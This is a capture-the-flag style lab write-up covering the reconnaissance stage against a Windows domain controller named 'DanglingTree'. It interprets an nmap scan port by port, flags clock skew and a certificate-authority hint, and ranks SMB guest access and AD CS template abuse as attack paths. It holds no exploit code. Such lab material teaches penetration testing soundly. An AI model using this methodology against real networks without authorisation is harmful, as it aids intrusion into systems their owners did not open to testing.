> **"What kind of machine am I looking at, what infrastructure does it expose, and where should I investigate first?"**

Target:

```text
10.129.28.174
```

Hostname discovered:

```text
dc.danglingtree.htb
```

Domain:

```text
danglingtree.htb
```

---

## 0.2 Initial Scan

```text
nmap --privileged -sCV -oA nmap_results 10.129.28.174
```

The scan identifies the host as:

```text
Windows
Domain Controller
```

The most important discovery is not any single port.

It is the **combination of services**.

---

# 0.3 Port-by-Port Situational Awareness

|  Port  | Service            | What I Should Think                                                                                                                                                  |
| :----: | :----------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|  `53`  | DNS                | This is likely part of the domain infrastructure. DNS can reveal hostnames and domain information.                                                                   |
|  `80`  | IIS HTTP           | There is a web service. I should investigate it for applications, authentication portals, management interfaces, and information disclosure.                         |
|  `88`  | Kerberos           | Strong indicator of Active Directory. Kerberos authentication and time synchronization are now important considerations.                                             |
|  `135` | MSRPC              | Windows RPC is exposed. This supports various Windows management and AD-related operations.                                                                          |
|  `139` | NetBIOS            | Legacy Windows networking is available. SMB-related enumeration may be possible.                                                                                     |
|  `389` | LDAP               | Active Directory directory services are exposed. This may eventually provide users, groups, computers, and other AD information once appropriate access is obtained. |
|  `443` | HTTPS              | Another web-facing service exists. The TLS certificate is particularly interesting because its CN references `danglingtree-DC-CA`.                                   |
|  `445` | SMB                | High-priority enumeration target. I should check shares, anonymous/Guest access, and exposed files.                                                                  |
|  `464` | Kerberos Password  | Supports Kerberos password-change functionality and further confirms an AD environment.                                                                              |
|  `593` | RPC over HTTP      | Additional Windows RPC functionality is exposed.                                                                                                                     |
|  `636` | LDAPS              | Secure LDAP is available, giving another path for authenticated AD enumeration.                                                                                      |
| `3268` | Global Catalog     | Confirms a domain/forest directory infrastructure and provides another directory-query interface.                                                                    |
| `3269` | Global Catalog SSL | Secure Global Catalog access.                                                                                                                                        |
| `3389` | RDP                | Remote Desktop is exposed, potentially useful after obtaining appropriate credentials.                                                                               |

---

# 0.4 The Biggest Finding — This Is a Domain Controller

Several services together strongly indicate:

```text
Kerberos
   +
LDAP
   +
SMB
   +
Global Catalog
   +
DNS
   +
Windows RPC
```

Therefore my mental model changes from:

```text
"Windows host"
```

to:

```text
"Active Directory Domain Controller"
```

This distinction is extremely important.

I should now think in terms of:

```text
Users
Groups
ACLs
Credentials
Kerberos
LDAP
SMB
AD CS
Domain privileges
```

rather than treating the machine like a standalone Windows server.

The scan itself confirms:

```text
Domain: danglingtree.htb
Site: Default-First-Site-Name
Host: dc.danglingtree.htb
```

---

# 0.5 SMB — High-Priority Enumeration Target

Port:

```text
445/tcp
```

is open.

The scan also reports:

```text
SMB 3.1.1
Message signing enabled and required
```

### Situational Awareness

The first question should be:

> **"Can I access SMB without credentials?"**

Why?

Because anonymous or Guest access could expose:

```text
Shares
Documents
Configuration
Credentials
Internal information
```

The required SMB signing also tells me that I should **not immediately focus on SMB relay** as the primary path.

Instead:

```text
SMB
 ↓
Anonymous / Guest access
 ↓
Share enumeration
 ↓
Information disclosure
```

This is exactly the direction that becomes important later in the DanglingTree chain.

---

# 0.6 LDAP — Domain Enumeration Potential

Ports:

```text
389 LDAP
636 LDAPS
3268 Global Catalog
3269 Global Catalog SSL
```

are all exposed.

### Situational Awareness

This tells me that the Domain Controller is providing multiple directory interfaces.

Once I obtain valid domain credentials, I should think about:

```text
LDAP
 ↓
Users
Groups
Computer objects
Group memberships
ACLs
PKI objects
Certificate templates
```

This becomes especially important later because the attack chain eventually relies heavily on **Active Directory permissions and AD CS objects**.

---

# 0.7 Kerberos — Time Is Now Important

Port:

```text
88/tcp
```

is open.

Nmap reports:

```text
clock-skew: -1h06m29s
```

### Situational Awareness

Kerberos is sensitive to clock differences.

Therefore I should record this immediately:

```text
Kerberos detected
        +
~1 hour clock difference
        ↓
Potential authentication problems
```

This is not necessarily an immediate blocker, but it is something I should remember if Kerberos authentication later fails.

The documented attack run ultimately states that a `faketime` workaround was **not required**.

### Mental Note

Don't blindly troubleshoot Kerberos credentials first.

If authentication fails, check:

```text
My system time
        ↓
DC time
        ↓
Kerberos error
```

before assuming the credentials are wrong.

---

# 0.8 HTTPS Certificate — Interesting PKI Clue

Port `443` exposes a TLS certificate with:

```text
Subject:
CN = danglingtree-DC-CA
```

This is an important clue.

The name:

```text
DC-CA
```

suggests that the Domain Controller is associated with a Certificate Authority.

### Situational Awareness

At this point I don't yet know whether AD CS is exploitable.

I **do not jump to ESC1/ESC4 immediately**.

Instead, I record a hypothesis:

```text
HTTPS certificate
       ↓
danglingtree-DC-CA
       ↓
Possible Enterprise CA
       ↓
Investigate AD CS later
```

This becomes highly relevant because the eventual privilege escalation involves AD CS certificate-template abuse.

---

# 0.9 IIS — Web Attack Surface

Port:

```text
80/tcp
```

reports:

```text
Microsoft IIS 10.0
```

and:

```text
Potentially risky methods:
TRACE
```

### Situational Awareness

The important discovery is:

```text
HTTP service exists
```

not simply that `TRACE` is enabled.

I should investigate:

```text
http://10.129.28.174/
```

and determine:

* What application is running?
* Is authentication required?
* Are there virtual hosts?
* Are there management interfaces?
* Does HTTPS expose something different?
* Are there useful hostnames?
* Is there information disclosure?

`TRACE` being enabled is worth documenting, but by itself it does not establish a useful exploitation path.

---

# 0.10 RDP — Potential Later Access

Port:

```text
3389/tcp
```

is open.

### Situational Awareness

I should **not immediately attempt RDP**.

I currently have:

```text
No known valid credentials
```

Therefore RDP is a:

```text
Potential authenticated access mechanism
```

rather than my immediate attack path.

The correct thought process is:

```text
3389 open
     ↓
Need valid credentials
     ↓
Find credentials first
     ↓
Evaluate RDP later
```

---

# 0.11 Second Nmap Scan

The targeted scan checks:

```text
443
2000
8080
8443
9998
17017
17020
```

Results:

```text
443/tcp  open
```

while the others are:

```text
filtered
```

### Situational Awareness

This tells me that several commonly interesting web/application ports are **not directly reachable**.

Therefore I should avoid wasting time blindly attacking:

```text
8080
8443
9998
17017
17020
```

The current externally visible web services are primarily:

```text
80
443
```

---

# 0.12 Overall Attack-Surface Map

After Nmap, my mental map should look like:

```text
                         ┌──────────────────────┐
                         │ 10.129.28.174        │
                         │ dc.danglingtree.htb  │
                         │                      │
                         │ DOMAIN CONTROLLER    │
                         └──────────┬───────────┘
                                    │
        ┌───────────────┬───────────┼───────────────┬──────────────┐
        │               │           │               │              │
       SMB            LDAP       Kerberos          Web            RDP
      :445         :389/636       :88            :80/443         :3389
        │               │           │               │
        │               │           │               ├─ IIS
        │               │           │               └─ DC-CA cert
        │               │           │
        │               │           └─ Time sensitive
        │               │
        │               └─ AD enumeration
        │
        └─ Anonymous/Guest?
             │
             └─ Shares
                  │
                  └─ Information disclosure
```

---

# 0.13 Priority Assessment

Based purely on the Nmap results, I would prioritize:

| Priority | Attack Surface          | Reason                                                                 |
| :------: | :---------------------- | :--------------------------------------------------------------------- |
|   **1**  | **SMB `445`**           | High-value AD service and potential anonymous/Guest share access.      |
|   **2**  | **HTTP/HTTPS `80/443`** | Web applications and management interfaces may provide initial access. |
|   **3**  | **LDAP/LDAPS**          | Important once valid domain credentials are obtained.                  |
|   **4**  | **AD CS / PKI**         | TLS certificate provides an early clue that PKI may be present.        |
|   **5**  | **Kerberos `88`**       | Critical authentication infrastructure; monitor clock synchronization. |
|   **6**  | **RDP `3389`**          | Useful after obtaining suitable credentials.                           |

---

# 0.14 The Correct Mental Transition

The most important lesson from this Nmap scan is **not memorizing what ports mean**.

It is recognizing the environment.

### Before Nmap

```text
10.129.28.174
     ↓
Unknown Windows host
```

### After Nmap

```text
10.129.28.174
     ↓
dc.danglingtree.htb
     ↓
danglingtree.htb
     ↓
Active Directory Domain Controller
     ↓
SMB + LDAP + Kerberos + Global Catalog
     ↓
Web services
     ↓
Possible AD CS / PKI
```

Therefore, my next question becomes:

> **"What can I access anonymously before I start trying to authenticate or exploit anything?"**

That leads naturally to:

```text
SMB → Anonymous / Guest enumeration
```

which is the next stage of the DanglingTree attack chain.
